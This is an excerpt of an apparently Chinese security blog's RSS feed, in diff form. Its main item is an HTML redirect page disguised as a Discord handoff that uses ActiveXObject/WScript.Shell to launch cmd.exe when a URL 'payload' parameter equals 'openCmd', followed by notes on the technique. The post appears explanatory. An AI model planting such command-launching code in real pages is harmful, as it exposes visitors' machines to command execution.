+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-html&#34; data-lang=&#34;html&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;&amp;lt;!DOCTYPE html&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;html&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;lang&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;en&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;head&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;meta&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;charset&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;UTF-8&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;meta&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;name&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;viewport&amp;#34;&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;content&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;width=device-width, initial-scale=1.0&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;title&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;重定向中...&lt;span class=&#34;p&#34;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;title&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;script&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;nx&#34;&gt;onload&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;kd&#34;&gt;function&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &lt;span class=&#34;nx&#34;&gt;alert&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;确定要执行Discord弹窗操作吗？点击确定继续&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;p&#34;&gt;};&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;kd&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;getQueryParam&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;param&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &lt;span class=&#34;kr&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;urlParams&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;URLSearchParams&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;window&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;location&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;search&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;urlParams&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;get&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;param&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;kd&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;isValidPayload&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;payload&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &lt;span class=&#34;c1&#34;&gt;// 有效载荷验证逻辑
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;            &lt;span class=&#34;kr&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;regex&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;sr&#34;&gt;/^[a-zA-Z0-9_-]+$/&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;regex&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;test&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;payload&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;kd&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;openCmd&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &lt;span class=&#34;k&#34;&gt;try&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                &lt;span class=&#34;kd&#34;&gt;var&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;shell&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;ActiveXObject&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;WScript.Shell&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                &lt;span class=&#34;nx&#34;&gt;shell&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;run&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;cmd.exe&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;catch&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                &lt;span class=&#34;nx&#34;&gt;alert&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;当前浏览器不支持此操作或已被安全策略阻止&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;nb&#34;&gt;window&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;onload&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;kd&#34;&gt;function&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &lt;span class=&#34;kr&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;payload&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;getQueryParam&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;payload&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &lt;span class=&#34;kd&#34;&gt;let&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;targetUrl&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;https://discord.com/handoff&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;payload&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;isValidPayload&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;payload&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                &lt;span class=&#34;nx&#34;&gt;targetUrl&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;sb&#34;&gt;`?payload=&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;${&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;encodeURIComponent&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;payload&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;sb&#34;&gt;`&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;payload&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;===&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;openCmd&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;window&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;ActiveXObject&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                    &lt;span class=&#34;nx&#34;&gt;openCmd&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &lt;span class=&#34;nx&#34;&gt;setTimeout&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kd&#34;&gt;function&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                &lt;span class=&#34;nb&#34;&gt;window&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;location&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;href&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;targetUrl&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &lt;span class=&#34;p&#34;&gt;},&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;3000&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;p&#34;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;script&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;head&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;body&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;如果没有自动跳转，请&lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;a&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;id&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;redirectLink&amp;#34;&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;href&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;https://discord.com/handoff&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;点击此处&lt;span class=&#34;p&#34;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;。&lt;span class=&#34;p&#34;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;script&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;kr&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;payload&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;getQueryParam&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;payload&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;kd&#34;&gt;let&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;targetUrl&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;https://discord.com/handoff&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;payload&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;isValidPayload&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;payload&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &lt;span class=&#34;nx&#34;&gt;targetUrl&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;sb&#34;&gt;`?payload=&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;${&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;encodeURIComponent&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;payload&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;sb&#34;&gt;`&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;payload&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;===&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;openCmd&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;window&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;ActiveXObject&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                &lt;span class=&#34;nx&#34;&gt;openCmd&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;nb&#34;&gt;document&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;getElementById&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;redirectLink&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;).&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;href&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;targetUrl&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;p&#34;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;script&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;body&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;html&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h2 id=&#34;技术要点&#34;&gt;技术要点
+&lt;/h2&gt;&lt;ol&gt;
+&lt;li&gt;利用ActiveXObject实现Windows命令行调用&lt;/li&gt;
+&lt;li&gt;通过URL参数注入有效载荷&lt;/li&gt;
+&lt;li&gt;包含严格的有效载荷验证机制&lt;/li&gt;
+&lt;li&gt;实现3秒延迟自动跳转功能&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h2 id=&#34;影响范围&#34;&gt;影响范围
+&lt;/h2&gt;&lt;p&gt;仅支持Windows平台，依赖ActiveX组件特性实现命令执行。&lt;/p&gt;
+</description>
+        </item>
+        <item>
+        <title>黑盒测试——你是在测试渗透测试员，还是测试目标？</title>
+        <link>http://localhost:1313/p/%E9%BB%91%E7%9B%92%E6%B5%8B%E8%AF%95%E4%BD%A0%E6%98%AF%E5%9C%A8%E6%B5%8B%E8%AF%95%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%91%98%E8%BF%98%E6%98%AF%E6%B5%8B%E8%AF%95%E7%9B%AE%E6%A0%87/</link>
+        <pubDate>Tue, 05 Aug 2025 23:07:39 +0800</pubDate>
+        
